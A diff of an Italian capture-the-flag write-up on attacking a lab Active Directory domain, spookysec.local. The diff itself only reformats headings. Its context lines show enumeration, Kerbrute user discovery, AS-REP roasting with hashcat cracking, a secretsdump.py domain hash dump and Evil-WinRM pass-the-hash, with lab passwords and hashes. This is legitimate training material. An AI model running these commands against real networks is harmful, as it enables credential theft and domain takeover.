@@ -1,18 +1,15 @@
-@import url(https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw);ol{margin:0;padding:0}table td,table th{padding:0}.c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#333333;border-left-style:solid;border-bottom-width:0pt;width:451.4pt;border-top-color:#000000;border-bottom-style:solid}.c12{background-color:#212c42;color:#ffffff;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10.5pt;font-family:"Consolas";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c23{padding-top:0pt;padding-bottom:3pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c22{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c21{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:26pt;font-family:"Arial";font-style:normal}.c14{padding-top:20pt;padding-bottom:6pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c5{background-color:#333333;font-family:"Consolas";color:#a2fca2;font-weight:400}.c3{background-color:#333333;font-family:"Consolas";color:#ffffaa;font-weight:400}.c1{background-color:#333333;font-family:"Consolas";color:#ffffff;font-weight:400}.c6{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c19{border-spacing:0;border-collapse:collapse;margin-right:auto}.c24{background-color:#333333;font-family:"Consolas";color:#ade5fc;font-weight:400}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c16{background-color:#333333;font-family:"Consolas";color:#fcc28c;font-weight:400}.c7{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c18{background-color:#333333;font-family:"Consolas";color:#888888;font-weight:400}.c25{color:#ff5454;font-weight:700;font-family:"Courier New"}.c9{color:#000000;font-weight:400;font-family:"Courier New"}.c17{font-family:"Courier New";font-weight:400}.c20{color:inherit;text-decoration:inherit}.c27{max-width:451.4pt;padding:72pt 72pt 72pt 72pt}.c11{background-color:#ffffff}.c8{height:11pt}.c26{color:#18b218}.c15{height:0pt}.c13{background-color:#ffffaa}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}
 
 ![](images/image3.png)
 
-Introduzione
+# Introduzione
 
-Sistema operativo
-=================
+## Sistema operativo
 
 Windows
 
-Prerequisiti / tools
+# Prerequisiti / tools
 
 Impacket
-========
 
 [https://github.com/SecureAuthCorp/impacket](https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1731856544152452&usg=AOvVaw2SWLa5EmWkoyWVbSLFLt3l)
 
@@ -23,31 +20,30 @@ pip3 install -r /opt/impacket/requirements.txt
 cd /opt/impacket/ && python3 ./setup.py install
 
 Bloodhound e Neo4j
-==================
 
 apt install bloodhound neo4j
 
 Enum4linux
-==========
+
 
 Kerbrute
-========
+
 
 [https://github.com/ropnop/kerbrute/releases](https://www.google.com/url?q=https://github.com/ropnop/kerbrute/releases&sa=D&source=editors&ust=1731856544153419&usg=AOvVaw3c1DvAZmHm4qmSehyMnilF)
 
 Si scarica e poi si esegue con ./
 
 SMBclient e SMBget
-==================
+
 
 Evil-WinRM
-==========
+
 
 [https://github.com/Hackplayers/evil-winrm](https://www.google.com/url?q=https://github.com/Hackplayers/evil-winrm&sa=D&source=editors&ust=1731856544153906&usg=AOvVaw34DUjEAaFE7oFdRFAuOY40)
 
 Istruzioni di installazione nel link
 
-Enumeration
+# Enumeration
 
 NMAP
 ====
@@ -84,7 +80,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 136.61 seconds
 
 Enum4Linux
-==========
+
 
 enum4linux -a 10.10.243.171                                                                                                                       
 
@@ -199,7 +195,7 @@ Use of uninitialized value $global\_workgroup in concatenation (.) or string at 
 enum4linux complete on Sun Nov 21 15:03:10 2021
 
 Kerbrute
-========
+
 
 Per poterlo utilizzare si deve modificare il file /etc/hosts
 
@@ -231,7 +227,7 @@ Version: v1.0.3 (9dad6e1) - 11/21/21 - Ronnie Flathers @ropnop
 2021/11/21 17:05:23 >  \[+\] VALID USERNAME:       Robin@spookysec.local  
 2021/11/21 17:05:47 >  \[+\] VALID USERNAME:       Administrator@spookysec.local
 
-Exploitation
+# Exploitation
 
 Ho preso gli utenti significativi ottenuti dallo step precedente e li ho messi nel file users.txt
 
@@ -259,7 +255,7 @@ a858da15925713412a92d97035237685c3465afa0d75b289605d583908878c4c8c6cddba9af165cb
 \[-\] User Administrator@spookysec.local doesn't have UF\_DONT\_REQUIRE\_PREAUTH set  
 
 Hashcat
-=======
+
 
 Cercare negli esempi la tipologia di hash da qui [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://www.google.com/url?q=https://hashcat.net/wiki/doku.php?id%3Dexample_hashes&sa=D&source=editors&ust=1731856544158998&usg=AOvVaw0_ZYeKmcsV9ICVzunL3BYm)
 
@@ -277,7 +273,7 @@ a858da15925713412a92d97035237685c3465afa0d75b289605d583908878c4c8c6cddba9af165cb
 La password dell’utente svc-admin è management2005
 
 SMB enum con password
-=====================
+
 
 Con le credenziali ottenute in precedenza vediamo quali share sono disponibili
 
@@ -310,10 +306,10 @@ ottenendo questa stringa
 
 backup@spookysec.local:backup2517860
 
-Privilege escalation
+# Privilege escalation
 
 Impacket secretsdump.py
-=======================
+
 
 └─$ python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@spookysec.local  
 Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation  
@@ -396,7 +392,7 @@ ATTACKTIVEDIREC$:des-cbc-md5:5d1fea9e106d971c
 Otteniamo che l’NTLM hash di Administrator è 0e0363213e37b94221497260b0bcb4fc
 
 Evil-WinRM
-==========
+
 
 Per fare la login con il metodo pass the hash
 
